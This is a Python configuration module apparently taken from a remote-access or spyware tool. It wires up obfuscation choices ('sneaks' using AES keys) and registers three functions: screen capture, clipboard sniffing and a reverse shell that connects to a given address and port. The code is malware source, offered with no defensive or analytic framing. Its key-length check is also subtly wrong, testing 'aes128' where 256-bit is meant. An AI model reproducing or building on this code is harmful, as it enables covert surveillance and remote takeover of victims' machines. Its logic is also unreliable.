from config import *
from .misc import clipboardSniffer, grabSS # type: ignore
from .sneaks import obfuscation
from .shell import ReverseShell

def makeConfig() -> None:
    if PARAM.get("sneak") != None and obfuscation.SNEAKS.get(PARAM["sneak"]) != None:
        METHODS["sneak"] = obfuscation.SNEAKS[PARAM["sneak"]] 
    else:
        METHODS["sneak"] = obfuscation.SNEAKS["nothing"]
        return
    if PARAM["sneak"] in ["aes128", "aes192", "aes256"] and PARAM.get("key") == None:
        PARAM["key"] = ""
        return
    if PARAM["sneak"] == "aes128" and len(PARAM["key"]) != 32:
        raise Exception("Invalid key for obfuscation method: 128-bit key required")
    elif PARAM["sneak"] == "aes192" and len(PARAM["key"]) != 48:
        raise Exception("Invalid key for obfuscation method: 192-bit key required")
    elif PARAM["sneak"] == "aes128" and len(PARAM["key"]) != 64:
        raise Exception("Invalid key for obfuscation method: 256-bit key required")
    METHODS["screenshot"] = lambda delay=0: grabSS(delay)
    METHODS["clipboard"] = lambda delay=0: clipboardSniffer(delay)
    METHODS["shell"] = lambda addr, port, ipv6 = False: ReverseShell.startService(addr, port, ipv6)